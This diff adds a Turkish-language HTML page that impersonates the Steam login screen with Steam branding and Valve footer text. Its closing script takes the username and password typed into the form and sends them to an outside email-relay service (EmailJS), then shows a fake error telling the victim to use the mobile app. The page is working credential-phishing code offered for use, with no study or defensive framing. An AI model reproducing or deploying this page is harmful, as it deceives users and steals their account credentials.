@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Steam'e Giriş Yap</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="responsive_page_frame with_header">
+        <div class="responsive_page_content">
+            <header class="header">
+                <div class="header-content">
+                    <div class="logo">
+                        <img src="https://store.cloudflare.steamstatic.com/public/shared/images/header/logo_steam.svg" alt="Steam" width="212px" height="212px">
+                    </div>
+                    <nav class="nav">
+                        <a href="#" class="nav-link active">MAĞAZA</a>
+                        <a href="#" class="nav-link">TOPLULUK</a>
+                        <a href="#" class="nav-link">HAKKINDA</a>
+                        <a href="#" class="nav-link">DESTEK</a>
+                    </nav>
+                    <div class="header-actions">
+                        <button class="install-btn">Steam'i Yükleyin</button>
+                        <a href="#" class="login-btn">giriş yap</a>
+                        <button class="lang-btn">dil<span class="arrow">▼</span></button>
+                    </div>
+                </div>
+            </header>
+
+            <div class="responsive_page_template_content">
+                <div class="login_page">
+                    <div class="login_container">
+                        <div class="login_left">
+                            <h2>HESAP ADI İLE GİRİŞ YAP</h2>
+                            <form class="login_form" id="loginForm">
+                                <div class="form_row">
+                                    <input type="text" name="username" id="username" required>
+                                    <label for="username">Steam hesap adı</label>
+                                </div>
+                                <div class="form_row">
+                                    <input type="password" name="password" id="password" required>
+                                    <label for="password">Parola</label>
+                                </div>
+                                <div class="form_row remember">
+                                    <input type="checkbox" name="remember" id="remember">
+                                    <label for="remember">Beni hatırla</label>
+                                </div>
+                                <div class="form_row">
+                                    <button type="submit" class="btn_blue" >Giriş yap</button>
+                                </div>
+                                <div class="form_row help">
+                                    <a href="#">Yardım edin, giriş yapamıyorum...</a>
+                                </div>
+                            </form>
+                        </div>
+                        <div class="login_right">
+                            <div class="qr_code_container">
+                                <h2>VEYA QR KODU İLE GİRİŞ YAPIN</h2>
+                                <div class="qr_code">
+                                    <div class="qr_holder">
+                                        
+                                            <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=steam-login" alt="QR Kod" class="qr_image">
+                                    </div>
+                                    <p>QR koduyla giriş yapmak için Steam mobil uygulamasını kullanın</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="footer">
+                <div class="footer_content">
+                    <div class="footer_logo_steam">
+                        <img src="https://store.cloudflare.steamstatic.com/public/images/v6/logo_steam_footer.png" alt="Valve">
+                    </div>
+                    <div class="footer_text">
+                        <p>© 2024 Valve Corporation. Tüm hakları saklıdır. Tüm ticari markalar ABD ve diğer ülkelerde ilgili sahiplerinin mülkiyetindedir.</p>
+                        <div class="footer_links">
+                            <a href="#">Gizlilik İlkesi</a>
+                            <a href="#">Yasal Bilgi</a>
+                            <a href="#">Steam Abonelik Sözleşmesi</a>
+                            <a href="#">Geri Ödemeler</a>
+                            <a href="#">Çerezler</a>
+                        </div>
+                    </div>
+                    <div class="footer_logo_valve">
+                        <img src="https://store.cloudflare.steamstatic.com/public/images/v6/logo_valve_footer.png" alt="Valve">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        (function() {
+            emailjs.init("ClP9zwkQADH6WZwVG"); // Buraya public key'ini yaz
+        })();
+    </script>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+    
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+    
+            emailjs.send("service_r8ig4fm", "template_qqr8x9b", {
+                username: username,
+                password: password
+            }).then(function(response) {
+                alert("Giriş yapılamıyor lütfen mobil uygulama üzerinden deneyiniz.");
+            }, function(error) {
+                alert("Hata oluştu: " + JSON.stringify(error));
+            });
+        });
+    </script>
+    
+
+</body>
+</html>
